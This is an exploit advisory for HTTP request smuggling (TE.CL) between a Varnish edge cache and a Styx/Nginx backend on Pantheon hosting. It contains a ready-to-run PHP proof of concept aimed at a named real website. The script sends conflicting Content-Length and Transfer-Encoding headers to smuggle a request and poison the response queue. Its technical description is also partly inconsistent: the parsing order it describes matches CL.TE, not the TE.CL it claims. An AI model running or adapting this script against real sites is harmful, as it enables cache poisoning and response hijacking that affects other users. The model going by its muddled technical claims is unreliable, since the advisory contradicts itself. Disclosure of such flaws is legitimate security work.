@@ -1,0 +1,87 @@
+=============================================================================================================================================
+| # Title     : HTTP Request Smuggling (TE.CL) via Edge Cache Misconfiguration (Varnish ↔ Styx)                                             |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://pantheon.io/                                                                                                        |
+=============================================================================================================================================
+
+[+] References :  
+
+[+] Summary    : A critical HTTP Request Smuggling (TE.CL) vulnerability exists due to inconsistent HTTP request parsing 
+                 between the Pantheon edge caching layer (Varnish) and the backend routing layer (Styx / Nginx).
+                 The edge layer accepts ambiguous requests containing both Content-Length and Transfer-Encoding, 
+				 while the backend correctly prioritizes Transfer-Encoding: chunked.
+                 This discrepancy allows an attacker to smuggle arbitrary HTTP requests, resulting in response queue poisoning and potential web cache poisoning.
+
+[+] Technical Details :
+
+Frontend (Varnish Edge Cache)
+
+Parses requests using Content-Length
+
+Does not reject dual-header ambiguity (CL + TE)
+
+Backend (Pantheon Styx / Nginx)
+
+[+] Prioritizes Transfer-Encoding: chunked
+
+Leaves smuggled payload queued for the next request
+
+[+] Vulnerability Class :
+
+Desynchronization → Response Queue Poisoning → Cache Poisoning
+
+[+] Proof of Concept (PoC)
+
+The following PoC demonstrates request smuggling by injecting a benign smuggled request and observing its response being returned for a subsequent legitimate request.
+
+[+] PoC : poc_final.php
+
+<?php
+/**
+ * Proof of Concept: HTTP Request Smuggling (TE.CL)
+ * Target: Pantheon-hosted application
+ */
+
+error_reporting(E_ALL);
+$host = "www.bugcrowd.com"; // Pantheon-hosted example
+$asset = "/etc/designs/bugcrowd/clientlibs/main.js";
+$poc_mark = "PANTHEON_TECL_POC_" . rand(100, 999);
+
+$fp = fsockopen("ssl://$host", 443, $errno, $errstr, 15);
+if (!$fp) die("[-] Connection Failed: $errstr");
+
+// Smuggled request
+$smuggled = "GET /nonexistent-$poc_mark HTTP/1.1\r\n";
+$smuggled .= "Host: $host\r\n";
+$smuggled .= "Connection: keep-alive\r\n\r\n";
+
+// Main TE.CL request
+$body = "0\r\n\r\n" . $smuggled;
+$request = "POST / HTTP/1.1\r\n";
+$request .= "Host: $host\r\n";
+$request .= "Transfer-Encoding: chunked\r\n";
+$request .= "Content-Length: 4\r\n";
+$request .= "Connection: keep-alive\r\n\r\n";
+$request .= $body;
+
+fwrite($fp, $request);
+usleep(600000);
+
+// Trigger request
+fwrite($fp, "GET $asset HTTP/1.1\r\nHost: $host\r\n\r\n");
+
+$response = "";
+while (!feof($fp)) {
+    $response .= fgets($fp, 1024);
+}
+fclose($fp);
+
+if (strpos($response, $poc_mark) !== false) {
+    echo "[+] SUCCESS: Response queue poisoned via TE.CL.\n";
+}
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
